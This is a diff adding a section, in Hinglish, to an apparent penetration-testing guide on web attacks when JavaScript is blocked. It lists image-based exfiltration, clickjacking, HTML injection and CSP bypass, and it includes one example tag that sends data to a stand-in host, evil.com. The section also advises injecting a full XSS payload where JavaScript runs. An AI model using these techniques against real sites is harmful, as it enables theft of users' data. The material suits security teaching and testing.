@@ -165,6 +165,42 @@ Example:
 
 kaam nahi karein ge ya blocked ho jaayenge ❌
 
+### 🔐 Agar JavaScript block hai toh kya karein?
+
+Acha sawal! Hacker kya karta hai?
+
+✅ Kuch Alternate Attacks:
+
+🖼️ Image-based exfiltration
+
+**Kaise:** ```<img src="https://evil.com/steal?c=XYZ">```
+
+---
+
+agar allowed ho
+
+🧱 Clickjacking / Phishing
+
+**Kaise:** Form, fake button ya CSS-based UI banake
+
+💉 HTML injection
+
+**Kaise:**	Sirf HTML elements inject karne ki koshish
+
+🧙‍♂️ DOM-based CSP bypass	
+
+**Kaise:** Agar CSP weak ho, toh usko manipulate karna with script-src-elem
+
+
+
+---
+
+### ✅ Penetration Testing Tip:
+
+Tumhara goal ye hona chahiye:
+
+"Check karo JavaScript allowed hai ya nahi? Agar hai toh full XSS payload inject karo. Agar nahi, toh alternate methods try karo — ya CSP bypass check karo."
+
 
 
 
